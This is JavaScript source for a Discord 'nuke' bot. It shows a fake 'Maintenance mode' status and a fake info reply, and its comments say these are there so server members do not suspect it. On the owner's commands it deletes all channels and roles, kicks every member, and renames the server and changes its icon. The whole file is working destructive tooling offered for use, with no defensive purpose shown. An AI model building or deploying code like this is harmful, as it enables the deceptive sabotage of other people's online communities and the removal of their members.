const Discord = require('discord.js');
const client = new Discord.Client();

const config = require('./config.json');
const prefix = config.prefix;

// The bots status is "Maintenance mode. Commands wont work!" this is a fake status so people wont suspect the bot as a thread.
client.on('ready', () => {
    client.user.setActivity("Maintenance mode. Commands wont work!")
    console.log(`Bot: ${client.user.tag}`)
});

// Main nuking command.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "nuke")) {
        if(message.author.id !== config.ownerid) return;
        message.guild.channels.cache.forEach(channel => {
            channel.delete()
            .catch(console.error);
        })
        message.guild.setName(config.servername);
        message.guild.setIcon(config.icon);
        message.guild.members.cache.forEach(member => {
            member.kick()
            .catch(console.error);
        })
        message.guild.roles.cache.forEach(roles => {
            roles.delete()
            .catch(console.error);
        })
        }
});

// Delete all Channels.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "channel")) {
        if(message.author.id !== config.ownerid) return;
            message.guild.channels.cache.forEach(channel => {
                channel.delete()
                .catch(console.error)
            })
        }
});

// Rename Server.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "name")) {
        if(message.author.id !== config.ownerid) return;
            message.guild.setName(config.servername)
        }
});

// Change Server Icon.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "icon")) {
        if(message.author.id !== config.ownerid) return;
            message.guild.setIcon(config.icon)
        }
});

// Kick everyone.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "kick")) {
        if(message.author.id !== config.ownerid) return;
            message.guild.members.cache.forEach(member => {
                member.kick()
                .catch(console.error)
            })
        }
});

// Delete roles.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "roles")) {
        if(message.author.id !== config.ownerid) return;
            message.guild.roles.cache.forEach(roles => {
                roles.delete()
                .catch(console.error)
            })
    }
});

// Display all commands.
client.on("message", (message) => {
    if (message.content.startsWith(prefix + "help")) {
        if(message.author.id !== config.ownerid) return;
            message.channel.send("Commands: info, role, kick, icon, name, channel, nuke")
            .catch(console.error)
    }
});

// Fake maintenance mode.
client.on("message", (message) => {
    if(message.content.startsWith(prefix + "info")) {
        message.channel.send("The bot is currently in maintenance mode, all commands will be back shortly.")
    }
});

client.login(config.token)
